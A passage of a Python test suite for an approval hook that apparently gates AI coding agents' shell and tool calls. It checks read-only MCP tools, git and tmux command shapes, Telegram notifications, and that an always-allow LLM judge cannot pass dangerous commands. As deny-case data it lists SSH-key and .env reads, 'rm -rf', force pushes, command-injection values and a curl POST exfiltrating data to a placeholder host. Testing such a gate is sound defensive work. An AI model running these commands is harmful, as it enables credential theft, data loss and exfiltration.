                with self.subTest(path=str(path)):
                    self.assertFalse(e.classify(request(path), manifest)[0])
                    self.assertFalse(e._decide_request(request(path), manifest)[0])
            for tool in ['Write', 'Edit']:
                self.assertFalse(e._decide_request(request(artifact, tool), manifest)[0])

    def test_exact_agentify_tabs_empty_schema_is_deterministic(self):
        # Installed desktop MCP schema is {}, handler GET /tabs -> listTabs().
        manifest = self.loaded()
        request = self.event('true', tool_name='mcp__agentify__agentify_tabs', tool_input={})
        with mock.patch.object(e, '_decider_decide') as judge, \
                mock.patch.object(e.subprocess, 'run', side_effect=AssertionError('no execution')):
            self.assertEqual(e.classify(request, manifest), (True, 'agentify_tabs_readonly'))
            self.assertEqual(e._decide_request(request, manifest), (True, 'agentify_tabs_readonly'))
            judge.assert_not_called()

    def test_agentify_tabs_rejects_effectful_names_and_nonempty_or_invalid_args(self):
        manifest = self.loaded()
        cases = [('mcp__agentify__agentify_tabs', value) for value in [
            None, [], '', False, {'tabId': 'fixture-tab'}, {'url': 'https://fixture.invalid'},
            {'command': 'fixture-command'}, {'path': '/tmp/fixture'},
            {'description': 'API_KEY=syntheticvalue'}]]
        cases += [(name, {}) for name in ['mcp__agentify__agentify_tab_create',
            'mcp__agentify__agentify_tab_close', 'mcp__agentify__agentify_shutdown',
            'mcp__agentify__agentify_tabs_extra', 'mcp__other__agentify_tabs']]
        with mock.patch.object(e.subprocess, 'run', side_effect=AssertionError('no execution')):
            for name, args in cases:
                with self.subTest(tool=name, args=args):
                    request = self.event('true', tool_name=name, tool_input=args)
                    self.assertFalse(e.classify(request, manifest)[0])
                    self.assertFalse(e._decide_request(request, manifest)[0])

    def test_exact_agentify_status_is_read_only_and_unknown_tools_remain_unapproved(self):
        manifest = self.loaded()
        status = self.event('true', tool_name='mcp__agentify__agentify_status', tool_input={
            'model': 'opencode-go/gpt-6-luna', 'tabId': 't1', 'key': 'fable', 'vendorId': 'chatgpt'})
        with mock.patch.object(e, '_decider_decide') as judge:
            self.assertEqual(e._decide_request(status, manifest), (True, 'agentify_status_readonly'))
            judge.assert_not_called()
        for event in [self.event('true', tool_name='mcp__agentify__agentify_navigate',
                                 tool_input={'url': 'https://example.invalid'}),
                      self.event('true', tool_name='mcp__agentify__agentify_status',
                                 tool_input={'unexpected': 'value'})]:
            with self.subTest(tool=event['tool_name'], payload=event['tool_input']), \
                    mock.patch.object(e, '_decider_decide') as judge:
                self.assertFalse(e._decide_request(event, manifest)[0])
                judge.assert_not_called()
        protected = self.event('true', tool_name='mcp__agentify__agentify_status',
                               tool_input={'key': '/home/YOUR_USER/.ssh/id_rsa'})
        with mock.patch.object(e, '_decider_decide') as judge:
            self.assertEqual(e._decide_request(protected, manifest), (False, 'true_floor'))
            judge.assert_not_called()

    def test_auryn_incident_readonly_redirect_chain_is_bounded(self):
        source = self.repo / 'FORGE' / 'brain' / 'auryn'
        source.mkdir(parents=True)
        (source / 'weights-note.md').write_text('weights-council fixture\n')
        outside = self.base / 'outside'
        outside.mkdir()
        (outside / 'weights-note.md').write_text('weights-council outside fixture\n')
        self.manifest['classes'][0]['enabled'] = True
        self.manifest['classes'][1]['enabled'] = True
        manifest = self.loaded()
        revision = self.git('rev-parse', 'HEAD')
        command = (
            f'cd {self.repo}; '
            f'git log --oneline -3 {revision} 2>&1 | head -3; '
            f'git show --stat {revision} 2>&1 | head -15; '
            f"grep -rIl -i 'weights.council\\|weights-council' {source} 2>/dev/null | head")
        with mock.patch.object(e, '_decider_decide') as judge:
            allow, reason = e._decide_request(self.event(command), manifest)
            self.assertTrue(allow, reason)
            judge.assert_not_called()
        escape = source / 'escape'
        escape.symlink_to(outside, target_is_directory=True)
        for unsafe in [command.replace(str(source), str(outside)),
                       command.replace(str(source), str(escape)),
                       command.replace(str(source), str(self.repo)),
                       command.replace('2>/dev/null | head', '2>/dev/null | tee /tmp/unsafe-output'),
                       command.replace('head -3', 'sh', 1)]:
            with self.subTest(unsafe=unsafe), \
                    mock.patch.object(e, '_decider_decide', return_value=(True, 'accepted', 0, 'allow')) as judge:
                self.assertFalse(e._decide_request(self.event(unsafe), manifest)[0])
                judge.assert_not_called()

    def test_only_documented_auryn_weights_sibling_sessions_are_approved(self):
        manifest = self.loaded()
        commands = [
            "tmux new-session -d -s auryn-46 'claude-auryn --weights 4.6'",
            "tmux new-session -d -s auryn-45 'claude-auryn --weights 4.5'",
        ]
        for command in commands:
            with self.subTest(command=command), mock.patch.object(e, '_decider_decide') as judge:
                self.assertEqual(e._decide_request(self.event(command), manifest),
                                 (True, 'coordinator_auryn_sibling'))
                judge.assert_not_called()
        self.manifest['coordinator_ops']['classes']['codex_dispatch'] = False
        disabled = self.loaded()
        for command in commands:
            with self.subTest(disabled_sibling=command):
                self.assertFalse(e._decide_request(self.event(command), disabled)[0])
        denied = [
            "tmux new-session -d -s auryn-46 'claude-auryn --weights 4.5'",
            "tmux new-session -A -d -s auryn-46 'claude-auryn --weights 4.6'",
            "tmux new-session -d -s auryn-46 'claude-auryn --weights 4.6 --telegram'",
            "tmux new-session -d -s auryn-46 'claude -p --model claude-haiku'",
            "tmux new-session -d -s auryn-46 'claude-auryn --weights 4.6; rm README.org'",
            'tmux new-session -d -s auryn-46 "claude-auryn --weights $(cat model)"',
            'tmux send-keys -t auryn-46 "claude-auryn --weights 4.6" Enter',
        ]
        for command in denied:
            with self.subTest(denied=command), \
                    mock.patch.object(e, '_decider_decide', return_value=(True, 'accepted', 0, 'allow')) as judge:
                allow, reason = e._decide_request(self.event(command), manifest)
                self.assertFalse(allow, (command, reason))
                judge.assert_not_called()

    def test_queue_notification_state_is_truthful_and_actionable(self):
        self.flag.touch()
        cases = [('sent', 'Telegram notification delivered'),
                 ('sent_receipt_unavailable', 'Telegram notification delivered, but its local outcome receipt was unavailable'),
                 ('failed', 'Telegram notification delivery unconfirmed (failed)'),
                 ('unavailable', 'Telegram notification delivery unconfirmed (unavailable)'),
                 ('unconfigured', 'Telegram notification not delivered (unconfigured)')]
        for status, expected in cases:
            with self.subTest(notification_status=status):
                command = 'unknown-notify-' + status
                self.manifest['notifications'] = {'argv': ['/tmp/synthetic-notifier']}
                self.path.write_text(json.dumps(self.manifest))
                env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path),
                       'SO_APPROVAL_KIKIN_LOG': str(self.ledger),
                       'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
                out = io.StringIO()
                with mock.patch.dict(os.environ, env), \
                        mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event(command)))), \
                        mock.patch.object(e, '_notify_admiral', return_value=status), \
                        contextlib.redirect_stdout(out):
                    self.assertEqual(e.main(), 0)
                decision = json.loads(out.getvalue())['hookSpecificOutput']['decision']
                record = json.loads(self.ledger.read_text().splitlines()[-1])
                self.assertEqual(record['notification_status'], status)
                self.assertIn('approval-queue list --json', decision['message'])
                self.assertIn(expected, decision['message'])
                self.assertIn(record['queue_id'], decision['message'])
                self.assertNotIn('Desk/Telegram', decision['message'])

    def test_notifier_outcomes_distinguish_delivery_configuration_and_transport(self):
        manifest = self.loaded()
        manifest['notifications'] = {'argv': ['/tmp/synthetic-notifier']}
        event = self.event('synthetic refusal')
        with mock.patch.object(e.subprocess, 'run', return_value=subprocess.CompletedProcess([], 0)):
            self.assertEqual(e._notify_admiral(event, 'no_match_decider', True, True, manifest), 'sent')
        with mock.patch.object(e.subprocess, 'run', return_value=subprocess.CompletedProcess([], 1)):
            self.assertEqual(e._notify_admiral(event, 'no_match_decider', True, True, manifest), 'failed')
        with mock.patch.object(e.subprocess, 'run', return_value=subprocess.CompletedProcess([], 2)):
            self.assertEqual(e._notify_admiral(event, 'no_match_decider', True, True, manifest), 'unconfigured')
        with mock.patch.object(e.subprocess, 'run', return_value=subprocess.CompletedProcess([], 3)):
            self.assertEqual(e._notify_admiral(event, 'no_match_decider', True, True, manifest), 'unavailable')
        with mock.patch.object(e.subprocess, 'run', return_value=subprocess.CompletedProcess([], 4)):
            self.assertEqual(e._notify_admiral(event, 'no_match_decider', True, True, manifest), 'sent_receipt_unavailable')
        with mock.patch.object(e.subprocess, 'run', side_effect=OSError('fixture transport')):
            self.assertEqual(e._notify_admiral(event, 'no_match_decider', True, True, manifest), 'unavailable')
        manifest.pop('notifications')
        with mock.patch.object(e.subprocess, 'run') as send:
            self.assertEqual(e._notify_admiral(event, 'no_match_decider', True, True, manifest), 'unconfigured')
            send.assert_not_called()

    def _telegram_adapter(self):
        from importlib.machinery import SourceFileLoader
        path = REPO / 'all/.local/bin/approval-telegram-notify'
        loader = SourceFileLoader('approval_telegram_adapter_fixture', str(path))
        spec = importlib.util.spec_from_loader('approval_telegram_adapter_fixture', loader)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        return module

    def _telegram_state(self):
        state = self.base / '.claude' / 'channels' / 'telegram-auryn'
        state.mkdir(parents=True, mode=0o700)
        os.chmod(state.parent.parent, 0o700)
        os.chmod(state.parent, 0o700)
        (state / '.env').write_text('TELEGRAM_BOT_TOKEN=123:synthetic_token\n')
        (state / 'access.json').write_text(json.dumps({'allowFrom': ['424242']}))
        os.chmod(state / '.env', 0o600)
        os.chmod(state / 'access.json', 0o600)
        return state

    def test_existing_telegram_channel_state_resolves_offline_credentials(self):
        adapter = self._telegram_adapter()
        state = self._telegram_state()
        payload = {'schema': 'dotcortex.approval.notification.v1', 'request_sha': 'abc123abc123abcd',
                   'queue_id': 'a' * 24, 'queued': True, 'away': False}
        response = mock.MagicMock()
        response.__enter__.return_value.read.return_value = b'{"ok":true,"result":{"message_id":7}}'
        env = {'HOME': str(self.base), 'TELEGRAM_STATE_DIR': str(state),
               'TELEGRAM_API_BASE': 'https://fixture-telegram-api.invalid'}
        with mock.patch.dict(os.environ, env, clear=True), \
                mock.patch.object(adapter.sys, 'stdin', io.StringIO(json.dumps(payload))), \
                mock.patch.object(adapter.urllib.request, 'urlopen', return_value=response) as send:
            self.assertEqual(adapter.main(), 0)
        wire = json.loads(send.call_args.args[0].data.decode())
        self.assertEqual(wire['chat_id'], '424242')
        self.assertIn('approval\\-queue list \\-\\-json', wire['text'])
        self.assertIn('a' * 24, wire['text'])
        self.assertIn('does not approve', wire['text'])
        receipts = self.base / '.local/state/dotcortex/approval-telegram-receipts.jsonl'
        self.assertNotIn('synthetic_token', receipts.read_text())

    def test_telegram_adapter_missing_state_and_transport_failure_are_offline(self):
        adapter = self._telegram_adapter()
        payload = {'schema': 'dotcortex.approval.notification.v1', 'request_sha': 'abc123abc123abcd',
                   'queue_id': 'a' * 24, 'queued': True, 'away': True}
        with mock.patch.dict(os.environ, {'HOME': str(self.base)}, clear=True), \
                mock.patch.object(adapter.sys, 'stdin', io.StringIO(json.dumps(payload))), \
                mock.patch.object(adapter.urllib.request, 'urlopen') as send:
            self.assertEqual(adapter.main(), 2)
            send.assert_not_called()
        state = self._telegram_state()
        env = {'HOME': str(self.base), 'TELEGRAM_STATE_DIR': str(state),
               'TELEGRAM_API_BASE': 'https://fixture-telegram-api.invalid'}
        with mock.patch.dict(os.environ, env, clear=True), \
                mock.patch.object(adapter.sys, 'stdin', io.StringIO(json.dumps(payload))), \
                mock.patch.object(adapter.urllib.request, 'urlopen', side_effect=OSError('fixture transport')) as send:
            self.assertEqual(adapter.main(), 3)
            send.assert_called_once()

    def test_telegram_requires_private_api_base_without_default_or_credential_reads(self):
        adapter = self._telegram_adapter()
        payload = {'schema': 'dotcortex.approval.notification.v1', 'request_sha': 'abc123abc123abcd',
                   'queue_id': 'a' * 24, 'queued': True, 'away': True}
        response = mock.MagicMock()
        response.__enter__.return_value.read.return_value = b'{"ok":true,"result":{"message_id":7}}'
        for credentials in [
                {'APPROVAL_TELEGRAM_BOT_TOKEN': '123:synthetic_token', 'APPROVAL_TELEGRAM_CHAT_ID': '424242'},
                {'TELEGRAM_STATE_DIR': str(self.base / '.claude/channels/telegram-auryn')}]:
            with self.subTest(route=sorted(credentials)), \
                    mock.patch.dict(os.environ, {'HOME': str(self.base), **credentials}, clear=True), \
                    mock.patch.object(adapter.sys, 'stdin', io.StringIO(json.dumps(payload))), \
                    mock.patch.object(adapter, '_credentials', return_value=('123:synthetic_token', '424242')) as read, \
                    mock.patch.object(adapter, '_receipt'), \
                    mock.patch.object(adapter.urllib.request, 'urlopen', return_value=response) as send:
                self.assertEqual(adapter.main(), 2)
                read.assert_not_called()
                send.assert_not_called()

    def test_wrapper_delivery_status_is_unconfirmed_on_transport_or_timeout(self):
        from importlib.machinery import SourceFileLoader
        loader = SourceFileLoader('approval_wrapper_fixture', str(REPO / 'all/.local/bin/claude-hook-approval-inverted'))
        spec = importlib.util.spec_from_loader(loader.name, loader)
        wrapper = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(wrapper)
        manifest = self.loaded()
        manifest['notifications'] = {'argv': ['/tmp/synthetic-notifier']}
        cases = [(0, 'Telegram notification delivered'),
                 (2, 'Telegram notification not delivered (unconfigured)'),
                 (3, 'Telegram notification delivery unconfirmed (unavailable)'),
                 (4, 'Telegram notification delivered, but its local outcome receipt was unavailable'),
                 (1, 'Telegram notification delivery unconfirmed (failed)'),
                 (subprocess.TimeoutExpired('fixture', 0.75), 'Telegram notification delivery unconfirmed (unavailable)'),
                 (OSError('fixture transport'), 'Telegram notification delivery unconfirmed (failed)')]
        for result, expected in cases:
            with self.subTest(result=repr(result)), \
                    mock.patch.object(wrapper._runtime, '_runtime_manifest', return_value=manifest), \
                    mock.patch.object(wrapper, '_away_status', return_value=(True, 'away_flag')), \
                    mock.patch.object(wrapper._runtime, '_queue_upsert', return_value='a' * 24), \
                    mock.patch.object(wrapper.subprocess, 'run') as send:
                if isinstance(result, Exception):
                    send.side_effect = result
                else:
                    send.return_value = subprocess.CompletedProcess([], result)
                message = wrapper.defer(json.dumps(self.event('fixture-refusal')))['hookSpecificOutput']['decision']['message']
                self.assertIn(expected, message)
                send.assert_called_once()  # Never retry an uncertain send.
                if 'unconfirmed' in expected:
                    self.assertNotIn('not delivered', message)

    def test_telegram_accepted_send_lost_response_and_receipt_failure_do_not_retry(self):
        adapter = self._telegram_adapter()
        payload = {'schema': 'dotcortex.approval.notification.v1', 'request_sha': 'abc123abc123abcd',
                   'queue_id': 'a' * 24, 'queued': True, 'away': True}
        env = {'HOME': str(self.base), 'APPROVAL_TELEGRAM_BOT_TOKEN': '123:synthetic_token',
               'APPROVAL_TELEGRAM_CHAT_ID': '424242', 'TELEGRAM_API_BASE': 'https://fixture-telegram-api.invalid'}
        response = mock.MagicMock()
        # The fixture server accepted the request, but the response is lost.
        response.__enter__.return_value.read.side_effect = TimeoutError('accepted then response lost')
        with mock.patch.dict(os.environ, env, clear=True), \
                mock.patch.object(adapter.sys, 'stdin', io.StringIO(json.dumps(payload))), \
                mock.patch.object(adapter.urllib.request, 'urlopen', return_value=response) as send, \
                mock.patch.object(adapter, '_receipt') as receipt:
            self.assertEqual(adapter.main(), 3)
            send.assert_called_once()
            receipt.assert_not_called()
        response.__enter__.return_value.read.side_effect = None
        response.__enter__.return_value.read.return_value = b'{"ok":true,"result":{"message_id":7}}'
        with mock.patch.dict(os.environ, env, clear=True), \
                mock.patch.object(adapter.sys, 'stdin', io.StringIO(json.dumps(payload))), \
                mock.patch.object(adapter.urllib.request, 'urlopen', return_value=response) as send, \
                mock.patch.object(adapter, '_receipt', side_effect=OSError('fixture receipt failure')) as receipt:
            self.assertEqual(adapter.main(), 4)
            send.assert_called_once()
            receipt.assert_called_once()

    def test_compound_heredoc_coordinator_chain_allows_each_segment(self):
        self.manifest['gate_inversion'] = {'enabled': True, 'present_refusal': 'deny'}
        command = (
            f"cat > {self.prompt} <<'EOF'\n"
            "synthetic coordinator brief\n"
            "EOF\n"
            f"git -C {self.repo} commit -q -m 'test: compound' -- README.org\n"
            f"mailcortex send --from YOUR_SEAT@YOUR_HOST.helm --to YOUR_REVIEWER@YOUR_REVIEW_HOST.helm "
            f"--subject 'review ready' --body-file {self.prompt}"
        )
        result = e.classify(self.event(command), self.loaded())
        self.assertFalse(result[0], result)
        self.assertIn('true_floor', result[1])
        self.assertEqual(self.run_hook(command)['behavior'], 'deny')

    def test_compound_floor_refusal_names_the_failing_segment(self):
        self.manifest['gate_inversion'] = {'enabled': True, 'present_refusal': 'deny'}
        command = (
            f"git status\n"
            f"git -C {self.repo} commit -q -m 'test: compound' -- README.org\n"
            "rm -rf README.org"
        )
        result = e.classify(self.event(command), self.loaded())
        self.assertFalse(result[0], result)
        self.assertEqual(result[1], 'true_floor')
        self.assertEqual(self.run_hook(command)['behavior'], 'deny')
        record = json.loads(self.ledger.read_text().splitlines()[-1])
        self.assertEqual(record['reason'], 'true_floor')

    def test_heredoc_body_is_data_not_a_command(self):
        self.manifest['gate_inversion'] = {'enabled': True, 'present_refusal': 'deny'}
        command = (
            f"cat > {self.prompt} <<'EOF'\n"
            "rm -rf README.org\n"
            "git push --force origin master\n"
            "EOF\n"
            "git status"
        )
        result = e.classify(self.event(command), self.loaded())
        self.assertTrue(result[0], result)
        self.assertEqual(self.run_hook(command)['behavior'], 'allow')

    def test_command_substitution_must_not_hide_a_floor_segment(self):
        self.manifest['gate_inversion'] = {'enabled': True, 'present_refusal': 'deny'}
        self.assertEqual(self.run_hook('printf "%s" "$(git status)"')['behavior'], 'allow')
        dangerous = 'printf "%s" "$(rm -rf README.org)"'
        result = e.classify(self.event(dangerous), self.loaded())
        self.assertFalse(result[0], result)
        self.assertIn('true_floor', result[1])
        self.assertEqual(self.run_hook(dangerous)['behavior'], 'deny')

    def test_worktree_add_exact_and_deviations(self):
        command = f'git worktree add {self.wt}/worker -b worker master'
        self.allow(command)
        self.allow(f'git -C {self.repo} worktree add {self.wt}/worker -b worker master')
        for bad in [command + ' --force', command.replace('-b worker', '-B worker'),
                    command.replace('-b worker', '-b wrong'), command.replace(' master', ' HEAD'),
                    command.replace(str(self.wt), str(self.base / 'other'))]:
            self.ask(bad)

    def test_worktree_remove_and_prune_exact(self):
        path = self.wt / 'worker'
        self.git('worktree', 'add', str(path), '-b', 'worker', 'master')
        self.allow(f'git worktree remove {path}')
        self.allow('git worktree prune')
        self.ask(f'git worktree remove --force {path}')
        self.ask(f'git worktree remove {self.repo}')
        self.ask('git worktree prune --expire now')

    def test_worktree_symlink_escape_and_wrong_repo(self):
        outside = self.base / 'outside'
        outside.mkdir()
        (self.wt / 'escape').symlink_to(outside, target_is_directory=True)
        self.ask(f'git worktree add {self.wt}/escape/worker -b worker master')
        self.ask(f'git -C {outside} worktree prune')

    def test_ff_merge_requires_master_and_exact_shape(self):
        command = f'git -C {self.repo} merge --ff-only topic'
        self.allow(command)
        self.ask(command.replace('--ff-only', '--no-ff'))
        self.ask('git merge --ff-only topic')
        self.git('checkout', 'topic')
        self.ask(command)

    def test_historical_landing_merges_keep_the_live_allow(self):
        commands = [
            f'GIT_EDITOR=true DOTCORTEX_GUARD_ALLOW_DIRTY=1 git -C {self.repo} merge --no-ff -m "synthetic landing" topic',
            f'GIT_EDITOR=true git -C {self.repo} merge --no-ff -m "merge: the Admiral\'s Desk (admirals-desk-20261011, Codex Sol; landed on master)" admirals-desk-20261011',
            f'GIT_EDITOR=true git -C {self.repo} merge --no-ff -m "merge: Codex Telegram quota-aware repairs (quota-repairs-20261012, Codex Sol; landed on master)" quota-repairs-20261012',
            f'GIT_EDITOR=true git -C {self.repo} merge --no-ff -m "synthetic landing" topic 2>&1 | head -12',
            f'GIT_EDITOR=true DOTCORTEX_GUARD_ALLOW_DIRTY=1 git -C {self.repo} merge --no-ff -m "synthetic landing" topic 2>&1 | head -12',
        ]
        for command in commands:
            with self.subTest(command=command):
                result = e.classify(self.event(command), self.loaded())
                self.assertTrue(result[0], result)
        self.ask(f'git -C {self.repo} merge --no-ff --no-commit -m "synthetic landing" topic')

    def test_ff_push_uses_current_remote_tip_and_non_ff_asks(self):
        remote = self.base / 'origin.git'
        subprocess.run(['git', 'init', '--bare', str(remote)], capture_output=True, check=True)
        self.git('remote', 'add', 'origin', str(remote))
        self.git('push', 'origin', 'master')
        self.allow('git push origin master')
        for bad in ['git push --force origin master', 'git push origin topic', 'git push', 'git push --all origin']:
            self.ask(bad)
        # Move the real remote to a divergent commit WITHOUT updating origin/master.
        self.git('checkout', 'topic')
        (self.repo / 'README.org').write_text('remote divergence')
        self.git('commit', '-am', 'test: divergence')
        divergent = self.git('rev-parse', 'HEAD')
        self.git('push', 'origin', 'topic')  # transfer the object without refreshing origin/master
        subprocess.run(['git', '--git-dir', str(remote), 'update-ref', 'refs/heads/master', divergent], capture_output=True, check=True)
        self.git('checkout', 'master')
        self.ask('git push origin master')

    def test_commit_explicit_paths_and_deviations(self):
        for prefix in ['git', f'git -C {self.repo}']:
            self.allow(f'{prefix} commit -m "test: scoped" -- README.org')
            self.allow(f'{prefix} commit -F {self.message} -- README.org')
        for bad in ['git commit -m x --', 'git commit -m x', 'git commit -am x -- README.org',
                    'git commit --amend -m x -- README.org', 'git commit -m x -- .',
                    'git commit -m x -- :/', 'git commit -m x -- ../other',
                    f'git commit -F {self.repo}/README.org -- README.org']:
            self.ask(bad)

    def test_commit_inside_owned_worktree(self):
        path = self.wt / 'worker'
        self.git('worktree', 'add', str(path), '-b', 'worker', 'master')
        payload = self.event('git commit -m "test: scoped" -- README.org', cwd=str(path))
        self.assertEqual(e.classify(payload, self.loaded()), (True, 'coordinator_commit'))

    def test_codex_dispatch_requires_null_stdin_and_scoped_files(self):
        self.allow(self.dispatch())
        for bad in [self.dispatch().replace(' < /dev/null', ''),
                    self.dispatch().replace('--approve-for-me ', ''),
                    self.dispatch().replace(str(self.prompt), str(self.repo / 'README.org')),
                    self.dispatch().replace(str(self.log), '/etc/worker.log'),
                    self.dispatch() + ' rm README.org', self.dispatch().replace('$(cat ', '$(rm '),
                    self.dispatch().replace('YOUR_MODEL', 'YOUR_MODEL;id')]:
            self.ask(bad)

    def test_remote_codex_dispatch_proof_and_deviations(self):
        with mock.patch.object(e, '_coordinator_remote_proof', return_value=True) as proof:
            self.allow(self.remote_dispatch())
            self.assertTrue(proof.called)
            self.assertFalse(e.classify(self.event(self.remote_dispatch().replace('YOUR_BUILD_HOST', 'YOUR_OTHER_HOST')), self.loaded())[0])
            self.assertFalse(e.classify(self.event(self.remote_dispatch().replace(' < /dev/null', '')), self.loaded())[0])
        with mock.patch.object(e, '_coordinator_remote_proof', return_value=False):
            self.assertFalse(e.classify(self.event(self.remote_dispatch()), self.loaded())[0])

    def test_scp_exact_scope_and_deviations(self):
        command = f'scp {self.prompt} YOUR_BUILD_HOST:/tmp/YOUR_SEAT/prompt.txt'
        with mock.patch.object(e, '_coordinator_remote_proof', return_value=True):
            self.allow(command)
            self.allow(command.replace('/tmp/YOUR_SEAT/', '/tmp/YOUR_SEAT-job/'))
            for bad in [command.replace('/tmp/YOUR_SEAT/prompt.txt', '/etc/file'),
                        command.replace(str(self.prompt), str(self.repo / 'README.org')),
                        command.replace('scp ', 'scp -r '),
                        command.replace('YOUR_BUILD_HOST:', 'YOUR_OTHER_HOST:')]:
                self.assertFalse(e.classify(self.event(bad), self.loaded())[0], bad)
        with mock.patch.object(e, '_coordinator_remote_proof', return_value=False):
            self.assertFalse(e.classify(self.event(command), self.loaded())[0])

    def test_disabled_classes_do_not_grant(self):
        self.manifest['coordinator_ops']['classes'] = {name: False for name in NAMES}
        for command in [self.mail(), self.dispatch(), 'git worktree prune', 'git commit -m x -- README.org']:
            self.ask(command)

    def test_secret_symlink_and_floor_always_win(self):
        secret = self.base / '.env'
        secret.write_text('synthetic floor fixture')
        self.prompt.unlink()
        self.prompt.symlink_to(secret)
        self.ask(self.mail())
        self.ask(self.dispatch())
        for command in ['sudo true', 'git reset --hard HEAD', 'git -C ' + str(self.repo) + ' reset --hard HEAD',
                        'pip install example', 'cat ~/.ssh/id_rsa', 'cat KEEPASS.kdbx']:
            self.ask(command)

    def test_worst_case_always_allow_decider_cannot_approve_danger_or_bad_shapes(self):
        self.manifest['decider']['enabled'] = True
        self.manifest['decider']['kikin_url'] = 'https://YOUR_DECIDER.invalid/decide'
        self.loaded()
        commands = ['sudo true', 'git push --force origin master',
                    'git commit --amend -m x', 'git reset --hard HEAD',
                    'git branch -D synthetic-old', 'git filter-branch --tree-filter true master',
                    'rm -rf /home/YOUR_USER/outside-scratch',
                    'ssh -i /tmp/synthetic-key YOUR_HOST date',
                    'git -C ' + str(self.repo) + ' reset --soft HEAD', 'cat .env',
                    'cat ~/.claude.json', 'cat KEEPASS.kdbx', 'pip install synthetic-package',
                    'python3 -m pip install synthetic-package', 'kill -TERM 123',
                    "curl -X POST --data 'fleet inventory' https://external.invalid/collect"]
        for away in (False, True):
            if away:
                self.flag.touch()
            for command in commands:
                out = io.StringIO()
                env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.ledger),
                       'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
                with mock.patch.dict(os.environ, env), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event(command)))), contextlib.redirect_stdout(out), mock.patch.object(e, '_decider_decide', return_value=(True, 'accepted', 1, 'allow')) as decider:
                    e.main()
                result = json.loads(out.getvalue())['hookSpecificOutput']['decision']['behavior'] if out.getvalue().strip() else 'ask'
                self.assertEqual(result, 'deny', command)
                decider.assert_not_called()

    def test_judged_in_root_write_and_interpreter_can_be_allowed_by_decider(self):
        self.manifest['decider']['enabled'] = True
        self.loaded()
        for command in ['rm README.org', 'git add README.org', 'python3 -c "print(1)"']:
            with self.subTest(command=command):
                out = io.StringIO()
                env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.ledger),
                       'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
                with mock.patch.dict(os.environ, env), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event(command)))), contextlib.redirect_stdout(out), mock.patch.object(e, '_decider_decide', return_value=(True, 'accepted', 1, 'allow')) as judge:
                    e.main()
                self.assertEqual(json.loads(out.getvalue())['hookSpecificOutput']['decision']['behavior'], 'allow')
                judge.assert_called_once()
                record = json.loads(self.ledger.read_text().splitlines()[-1])
                self.assertEqual(record['decision_path'], 'judge')
                self.assertEqual(record['judge_verdict'], 'allow')

    def test_timeout_while_away_denies_and_preserves_request(self):
        self.flag.touch()
        self.loaded()
        out = io.StringIO()
        env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.ledger), 'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
        with mock.patch.dict(os.environ, env), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event('unknown-command')))), contextlib.redirect_stdout(out), mock.patch.object(e, 'classify', side_effect=TimeoutError('fixture deadline')):
            e.main()
        self.assertEqual(json.loads(out.getvalue())['hookSpecificOutput']['decision']['behavior'], 'deny')
        self.assertEqual(json.loads(self.queue.read_text())['request'], self.event('unknown-command'))

    def test_manifest_error_while_away_retains_full_request(self):
        self.flag.touch()
        self.manifest['schema'] = 'INVALID_SCHEMA'
        self.assertEqual(self.run_hook('unknown-command')['behavior'], 'deny')
        self.assertEqual(json.loads(self.queue.read_text())['request'], self.event('unknown-command'))
        self.path.write_text('{invalid-manifest')
        env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.ledger),
               'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
        with mock.patch.dict(os.environ, env), mock.patch.object(e, '_away_status', return_value=(True, 'away_flag')), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event('second-command')))), contextlib.redirect_stdout(io.StringIO()):
            e.main()
        self.assertEqual(json.loads(self.queue.read_text().splitlines()[-1])['request'], self.event('second-command'))

    def test_default_quiet_window_and_invalid_quiet_config(self):
        self.manifest['unattended'].pop('quiet_hours')
        instant = dt.datetime(2026, 1, 2, 14, tzinfo=dt.timezone.utc)  # Melbourne 01:00
        self.assertTrue(e._away_status(self.loaded(), now=instant)[0])
        self.manifest['unattended']['quiet_hours'] = {'enabled': True, 'start': 'bad-time'}
        self.assertEqual(e._away_status(self.loaded(), now=instant), (True, 'invalid_unattended'))

    def test_commit_directory_and_git_routing_overrides_are_refused(self):
        directory = self.repo / 'bundle'
        directory.mkdir()
        (directory / '.env').write_text('synthetic')
        self.ask('git commit -m x -- bundle')
        with mock.patch.dict(os.environ, {'GIT_DIR': str(self.base / 'other.git')}):
            self.assertFalse(e.classify(self.event('git commit -m x -- README.org'), self.loaded())[0])

    def test_codex_log_symlink_escape_is_refused(self):
        target = self.base / 'outside.log'
        target.touch()
        self.log.symlink_to(target)
        self.ask(self.dispatch())

    def test_remote_proof_fixed_argv_and_symlink_escape(self):
        config = self.manifest['coordinator_ops']
        paths = ['/tmp/YOUR_SEAT/prompt.txt', '/tmp/YOUR_SEAT/log.txt']
        completed = subprocess.CompletedProcess([], 0, '\n'.join(paths) + '\n', '')
        with mock.patch.object(e.subprocess, 'run', return_value=completed) as run:
            self.assertTrue(e._coordinator_remote_proof(config, paths, regular_input=paths[0]))
            argv = run.call_args.args[0]
            self.assertEqual(argv[:6], ['ssh', '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=1', 'YOUR_BUILD_HOST'])
            self.assertIn('test ! -L', argv[-1])
            self.assertEqual(run.call_args.kwargs['stdin'], subprocess.DEVNULL)
            self.assertLessEqual(run.call_args.kwargs['timeout'], 1)
        for stdout in ['/etc/passwd\n/tmp/YOUR_SEAT/log.txt\n', 'malformed', '\n'.join(paths + paths) + '\n']:
